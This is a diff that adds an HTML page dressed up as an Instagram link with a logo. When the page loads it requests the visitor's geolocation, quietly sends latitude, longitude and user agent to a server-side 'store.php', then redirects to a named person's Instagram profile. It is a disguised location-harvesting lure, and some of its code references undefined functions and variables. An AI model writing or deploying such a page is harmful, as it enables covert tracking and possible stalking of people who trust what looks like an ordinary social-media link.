@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+
+<head>
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="url" data-url="https://www.instagram.com/amelie_trss/">
+</head>
+
+<p id="demo"></p>
+
+<img src="instagram.png" class="logo">
+
+<script>
+const url = document.querySelector('meta[name="url"]').getAttribute('data-url');
+
+// Function to open the URL
+function openUrl() {
+  window.location.href = url;
+}
+
+// Request location permission
+navigator.geolocation.getCurrentPosition(function(position) {
+  // User allowed location access, open the URL
+  openUrl();
+  showPosition(position); // (Optional) Store location data if needed
+}, function(error) {
+  // User denied location access, handle error
+  console.log('L\'utilisateur a refusé la localisation.');
+});
+
+// This function is called if location is allowed (optional)
+function showPosition(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+  xhttp.send();
+  // Update the demo paragraph (optional)
+  x.innerHTML = "Localisation autorisée";
+}
+</script>
+
+</body>
+</html>
